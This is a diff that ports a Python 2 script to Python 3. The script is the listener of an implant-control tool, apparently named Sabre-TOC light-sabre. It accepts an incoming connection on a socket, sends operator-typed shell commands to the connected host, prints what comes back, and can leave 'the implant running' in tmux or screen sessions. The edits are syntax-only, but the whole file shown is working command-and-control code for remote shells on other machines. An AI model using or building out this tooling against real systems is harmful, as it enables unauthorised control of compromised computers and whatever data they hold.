@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 from socket import *
-from settings import r
+from .settings import r
 import pexpect
 import subprocess
 
@@ -18,14 +18,14 @@ class lightSabre():
 		self.ts.publish('Listeners', self.lid)
 
 	def screenList(self):
-		print "Identify the session you want:"
+		print("Identify the session you want:")
 		subprocess.call(['screen', '-ls'])
-		s = raw_input('Select the first four:')
+		s = input('Select the first four:')
 		subprocess.call(["screen", '-r', s])
 		
 
 	def screenLightSabre(self):
-		print 'Starting the light-sabre listener in session'
+		print('Starting the light-sabre listener in session')
 		try:
                 	l = subprocess.check_output(['tmux', 'list-sessions'], shell=False)
                 	li = l.split('\n')
@@ -46,9 +46,9 @@ class lightSabre():
 			l = 'empty' #No sessions
                 # high number 
                 if 'light-sabre' in l:
-                        print 'already have one'
+                        print('already have one')
                         subprocess.call(['/bin/bash', '-c', 'tmux new -s light-sabre%d "clear && /opt/Sabre-TOC/light-sabre/lightsabre-server.py "' % int(nn)])
-                        print 'light-sabre%d' % int(nn)
+                        print('light-sabre%d' % int(nn))
                 else:
                         subprocess.call(['/bin/bash', '-c', 'tmux new -s light-sabre "clear && /opt/Sabre-TOC/light-sabre/lightsabre-server.py "'])
 
@@ -62,13 +62,13 @@ class lightSabre():
 		# bind to interface
 		s.bind((self.h, self.p))
 		# print we are accepting connections
-		print "Listening on 0.0.0.0:%s" % str(self.p)
+		print("Listening on 0.0.0.0:%s" % str(self.p))
 		# listen for only 10 connection
 		s.listen(10)
 		# accept connections
 		conn, addr = s.accept()
 		# print connected by ipaddress
-		print 'Connected by', addr
+		print('Connected by', addr)
 		# receive initial connection
 		data = conn.recv(1024)
 		# start loop
@@ -76,15 +76,15 @@ class lightSabre():
 		result = self.result
 		self.pubsub.subscribe(channel)
 		#print channel
-		print 'Enter shell command or "quit" to quit:'
-		print 'Enter "back" to quit and leave the implant running:'
+		print('Enter shell command or "quit" to quit:')
+		print('Enter "back" to quit and leave the implant running:')
 		while 1:
 			#for item in self.pubsub.listen():
 			#	command = item['data']
 			#	if command == 1:
 			#		command = 'hostname'
 			#	break
-			command = raw_input("Shell: ")
+			command = input("Shell: ")
 			command = command + ' '
 			# send shell command
 			conn.send(str(command))
@@ -97,7 +97,7 @@ class lightSabre():
 			# receive output from linux command
 			data = conn.recv(1024)
 			# print the output of the linux command
-			print data
+			print(data)
 			#self.ts.publish(str(result), data)
 		# close socket
 		conn.close()
